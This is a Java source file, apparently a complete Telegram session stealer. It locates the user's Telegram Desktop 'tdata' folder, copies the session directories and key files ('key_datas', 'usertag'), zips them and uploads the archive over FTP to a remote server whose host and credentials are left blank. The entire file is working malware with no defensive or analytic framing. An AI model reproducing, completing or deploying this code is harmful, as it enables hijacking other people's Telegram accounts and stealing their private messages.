package com.stealer;

import com.stealer.service.StealerService;
import com.stealer.service.StealerServiceImpl;
import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.Objects;

public class Main {
    private static final String HOST_NAME = "";
    private static final int PORT = 21;
    private static final String USERNAME = "";
    private static final String PASSWORD = "";
    private static final String REMOTE_DIRECTORY = "/htdocs";
    private static StealerService stealerService = new StealerServiceImpl();

    public static void main(String[] args) {
        String pathusr = System.getProperty("user.home");
        String tdataPath = pathusr + "\\AppData\\Roaming\\Telegram Desktop\\tdata\\";
        String nameArchive = new SimpleDateFormat("dd_MM_yy_HH_mm").format(new Date());
        String tdataSessionZip = pathusr + "\\AppData\\Roaming\\Telegram Desktop\\" + nameArchive + ".zip";

        // Creating folders
        File connectionHashFolder = new File(tdataPath + "\\connection_hash");
        File mapFolder = new File(tdataPath + "\\map");
        connectionHashFolder.mkdirs();
        mapFolder.mkdirs();

        // Copy all session folders
        File[] folders = new File(tdataPath).listFiles(file -> file.isDirectory() && file.getName().length() > 15);
        for (File folder : folders) {
            File destinationFolder = new File(mapFolder, folder.getName());
            try {
                stealerService.copyFolder(folder, destinationFolder);
            } catch (IOException e) {
                throw new RuntimeException("Couldn't copy all session folders!");
            }
        }

        // Copy files (+usertag)
        List<File> files16 = new ArrayList<>(Arrays.asList(Objects.requireNonNull(new File(tdataPath)
                .listFiles(file -> file.isFile() && file.getName().matches(".{11,}")))));
        File usertagFile = new File(tdataPath, "usertag");
        File key_datas = new File(tdataPath, "key_datas");
        files16.add(usertagFile);
        files16.add(key_datas);
        for (File file : files16) {
            try {
                stealerService.copyFile(file, new File(connectionHashFolder, file.getName()));
            } catch (IOException e) {
                throw new RuntimeException("Couldn't copy files (+usertag)!");
            }
        }

        // Archivation folders
        String[] sourceFolders = {mapFolder.getAbsolutePath(), connectionHashFolder.getAbsolutePath()};
        stealerService.zipFolder(sourceFolders, tdataSessionZip);

        // Delete temporary folders
        stealerService.deleteFolder(connectionHashFolder);
        stealerService.deleteFolder(mapFolder);

        // FTP module to connect server
        FTPClient ftpClient = new FTPClient();
        try {
            ftpClient.connect(HOST_NAME, PORT);
            ftpClient.login(USERNAME, PASSWORD);
            ftpClient.enterLocalPassiveMode();
            ftpClient.setFileType(FTP.BINARY_FILE_TYPE);

            File localFile = new File(tdataSessionZip);
            FileInputStream inputStream = new FileInputStream(localFile);

            String remoteFileName = localFile.getName();
            String remoteFilePath = REMOTE_DIRECTORY + "/" + remoteFileName;

            boolean uploaded = ftpClient.storeFile(remoteFilePath, inputStream);
            inputStream.close();

            if (uploaded) {
                System.out.println("Archive uploaded successfully!");
            } else {
                System.out.println("Failed to upload archive.");
            }

            ftpClient.logout();
        } catch (IOException e) {
            throw new RuntimeException("Something went wrong when trying " +
                    "to logout from FTP server!");
        } finally {
            if (ftpClient.isConnected()) {
                try {
                    ftpClient.disconnect();
                } catch (IOException e) {
                    throw new RuntimeException("Something went wrong when trying " +
                            "to disconnect from FTP server!");
                }
            }
        }

    }
}
